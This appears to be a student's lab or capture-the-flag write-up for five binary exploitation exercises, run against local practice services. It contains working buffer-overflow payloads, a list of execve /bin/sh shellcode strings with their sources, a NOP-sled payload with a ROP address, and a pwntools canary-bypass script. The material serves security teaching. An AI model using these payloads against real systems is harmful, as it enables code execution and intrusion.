z5181159
buffer-1
===========================

General overview of problems faced
-------------------------------------
Had to watch Buffer Overflow videos by Kevin Du, Read about assembly in Art of Exploitation,
and seek help on slack

List of vulnerabilities
--------------------
1. Unchecked input buffer

Steps to exploit
------------------
1. Identify the size of input buffer
2. overwrite the address in $eax which calls the lose function with address of the win function
NOTE: python closes the stdin after piping input in order to hold the pipeline open use cat

Script/Command used
------------------
```
(python -c 'print "\x90"*64 +"\xd2\x91\x04\x08"';cat -) | nc localhost 5001
```
buffer-2...
=============
General overview of problems faced
-------------------------------------
Had to watch Buffer Overflow videos by Kevin Du, continue to read about assembly in Art of Exploitation,
seek help on slack and read the paper Stack Smashing for Fun and Profit

List of vulnerabilities
--------------------
1. Unchecked input buffer

Steps to exploit
------------------
1. Find an unchecked input buffer
2. Find the address of a function that can drop shell
3. locate registers to overflow
4. calculate byte distance for overflow
5. deploy exploit

Script/Command used
------------------
```
(python -c 'print "\x90"*72 +"\x28\xd6\xff\xff"+"\xcd\x84\x04\x08"';cat -) | nc localhost 5002
```
buffer-3...
=============
General overview of problems faced
-------------------------------------
I tried a couple of shell codes online and they didn't work, so I was convinced I hadn't understood how shellcode injection works. The major challenges were 
1. understand how shellcode works
2. what exactly did the c program do
3. where is the buffer stored and is it executable 

List of vulnerabilities
--------------------
1. arbitaray code execution

Steps to exploit
------------------
1. Find a shellcode that works for the victim system
2. deploy the shellcode

Script/Command used
------------------
```
#!/usr/bin/env python2

#shell_code="\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"
#https://www.exploit-db.com/exploits/38150/
#shell_code="\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
#http://shell-storm.org/shellcode/files/shellcode-603.php
#shell_code="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"          
#http://shell-storm.org/shellcode/files/shellcode-806.php
#shell_code="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/exploits/42179/
#shell_code="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
#https://www.exploit-db.com/exploits/36858/
#shell_code="\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/exploits/13691/
#shell_code="\x31\xc0\x40\x74\x15\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"
#https://packetstormsecurity.com/files/134638/Linux-x86-x86_64-execve-Shellcode.html
shell_code="\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"
#http://shell-storm.org/shellcode/files/shellcode-237.php
#print(len(shell_code))
#print("\x90"*(512-len(little_endian_shell_code))+little_endian_shell_code)
print(shell_code+"\xcc"*(512-len(shell_code)))


(python buffer-3.py; cat -) | nc localhost 5003
```
buffer-4...
=============
General overview of problems faced
-------------------------------------
I found the location and size of the buffer, but was not able to get the exploit to work remotely
1. finding local variables and functions 
2. inserting traps in code to see there position in the buffer
3. change of address in local and over the network

List of vulnerabilities
--------------------
1. arbitaray code execution

Steps to exploit
------------------
1. make the payload long enough to overwrite $eip
2. find a rop gadget to call $eax
3. deploy exploit

Script/Command used
------------------
```
#!/usr/bin/env python2

#shell_code="\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"
#http://shell-storm.org/shellcode/files/shellcode-237.php

print '\x90'*4000+'\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'+'\x90'*4172+'\x06\x84\x04\x08'

```

canary-1...
=============
General overview of problems faced
-------------------------------------
I was unable to find the memory address to override even though I could see '1337' string being used to compare so started overwriting memory using that string

List of vulnerabilities
--------------------
1. easy to override canary security

Steps to exploit
------------------
1. use pwntools to overwrite memory
2. use the string '1337' found through pwndbg

Script/Command used
------------------
```
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

print io.recvuntil("...")
io.sendline("1337"*9)
#print io.recvuntil("calm down.")
#io.sendline("ls")
io.interactive()


```


